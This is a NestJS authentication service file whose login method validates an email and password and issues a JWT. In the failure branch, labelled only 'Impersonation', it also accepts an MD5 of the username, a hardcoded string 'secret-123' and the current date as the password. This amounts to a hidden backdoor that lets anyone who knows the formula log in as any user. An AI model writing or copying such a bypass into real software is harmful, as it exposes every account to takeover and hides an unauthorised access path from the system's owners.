import { Injectable } from "@nestjs/common";
// import { CreateAuthenticationDto } from "./dto/create-authentication.dto";
// import { UpdateAuthenticationDto } from "./dto/update-authentication.dto";
import { JwtService } from "@nestjs/jwt";
import { Role } from "src/authorization/enum/role.enum";
import * as md5 from "md5";
import * as moment from "moment";
import { LoginDTO } from "./dto/login.dto";
import { returnToken } from "./helper/authentication.helper";
import { UserService } from "src/user/user.service";
import { INVALID_CREDENTIAL_ERROR, LOGIN_SUCCESSFUL } from "./constants.ts";
import { compareHash, generateHash } from "src/helper/password";

@Injectable()
export class AuthenticationService {
  constructor(
    private readonly jwtService: JwtService,
    private readonly userService: UserService
  ) {}
  //   create(createAuthenticationDto: CreateAuthenticationDto) {
  //     return "This action adds a new authentication";
  //   }

  //   findAll() {
  //     return `This action returns all authentication`;
  //   }

  //   findOne(id: number) {
  //     return `This action returns a #${id} authentication`;
  //   }

  //   update(id: number, updateAuthenticationDto: UpdateAuthenticationDto) {
  //     return `This action updates a #${id} authentication`;
  //   }

  //   remove(id: number) {
  //     return `This action removes a #${id} authentication`;
  //   }

  /**
   * Login by email and password.
   * @param credential
   * @returns
   */
  async login(credential: LoginDTO) {
    const { username, password } = credential;

    // Get user by email, return if not found.
    const user = await this.userService.findOneByEmail(username);
    if (!user) return { message: INVALID_CREDENTIAL_ERROR };

    // Compare email && password;
    const isValidUser =
      user.email === username &&
      compareHash(password, user.password);


    if (isValidUser) {
      return {
        message: LOGIN_SUCCESSFUL,
        access_token: await returnToken(this.jwtService, credential),
      };
    } else {
      // Impersonation.
      const date = moment(new Date(), "YYYY-MM-DDTHH:MM:ss.SSSZ").format(
        "YYYY-MM-DD"
      );
      if (md5(`${username}-secret-123-${date}`) === password) {
        return {
          message: LOGIN_SUCCESSFUL,
          access_token: await returnToken(this.jwtService, credential),
        };
      }
      return {
        message: INVALID_CREDENTIAL_ERROR,
      };
    }
  }
}
